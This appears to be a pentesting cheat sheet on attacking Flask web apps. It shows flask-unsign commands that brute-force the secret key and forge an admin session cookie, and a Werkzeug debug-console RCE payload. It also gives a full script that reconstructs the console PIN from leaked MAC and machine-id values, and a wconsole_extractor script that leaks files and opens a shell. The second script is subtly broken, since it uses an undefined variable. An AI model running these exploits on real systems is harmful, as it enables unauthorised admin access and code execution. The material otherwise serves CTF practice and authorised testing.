
# Informations

- Default session's cookie's name : `session`
- Default session's cookie's format : JWT signed with the Flask secret key

# Weak Secret Key

**Bruteforce secret key**
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie "JWT_HERE" --no-literal-eval
```

**Craft a new session cookie**
```bash
flask-unsign --sign --cookie "{'admin': 'true', 'username':'guest'}" --secret 's3cre3t'
```

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask

# Debug mode

When debug is on, a `/console` endpoint is listening to execute python code leading to RCE and fun !

**RCE payload**
```python
__import__('os').popen('whoami').read();
```
**Exploit**
- https://github.com/its-arun/Werkzeug-Debug-RCE

### Endpoint is PIN protected

The fact is that the PIN is generated based on some informations that can be leaked : 
- PIN generation source code : https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py

To exploit the console PIN, we need two sets of variables, 
- `probably_public_bits` 
	- `username`: Refers to the user who initiated the Flask session.
	- `modname`: Typically designated as `flask.app`.
	- `getattr(app, '__name__', getattr(app.__class__, '__name__'))`: Generally resolved to **Flask**.
	- `getattr(mod, '__file__', None)`: Represents the full path to `app.py` within the Flask directory 
		- (e.g., `/usr/local/lib/python3.5/dist-packages/flask/app.py` but it can change from the python version and the OS system)
		- If `app.py` is not applicable, **try** `app.pyc`

- `private_bits`
	- `uuid.getnode()`: Fetches the MAC address of the current machine, with `str(uuid.getnode())` **translating it into a decimal format**.
		- **leak** `/proc/net/arp` to find the device ID, then **extract the MAC address** from `/sys/class/net/<device id>/address`
	- `get_machine_id()`: Concatenates data from `/etc/machine-id` or `/proc/sys/kernel/random/boot_id` with the first line of `/proc/self/cgroup` post the last slash (`/`).

***Exploit n°1*** : Edit `probably_public_bits` and `private_bits` to generate the Werkzeug PIN
```python
import hashlib
from itertools import chain
probably_public_bits = [
    'web3_user',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```
***Note :*** If you are on an **old version** of Werkzeug, try changing the **hashing algorithm to md5** instead of sha1.

***Exploit n°2*** 

```bash
pip install wconsole_extractor
```

```python
from wconsole_extractor import WConsoleExtractor, info
import requests

def leak_function(filename) -> str:
    r = requests.get(f"http://exemple.com:59085/services?search={filename}")
    if r.status_code == 200:
		    # The return must be the content of the file only, not the full HTML page
		    # Is the file is not found, the returned value should be ""
		    if "File not found" in r.text : 
			    return ""
			else :
	            return content.split("Start of the file")[1].split("End of the file")[0] 
    else:
        return ""

extractor = WConsoleExtractor(
    target="http://exemple.com:8888",
    leak_function=leak_function
)


info(f"PIN CODE: {extractor.pin_code}")
extractor.shell()
```

***wconsole_extractor source code :*** https://github.com/Ruulian/wconsole_extractor
# Resources

- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug


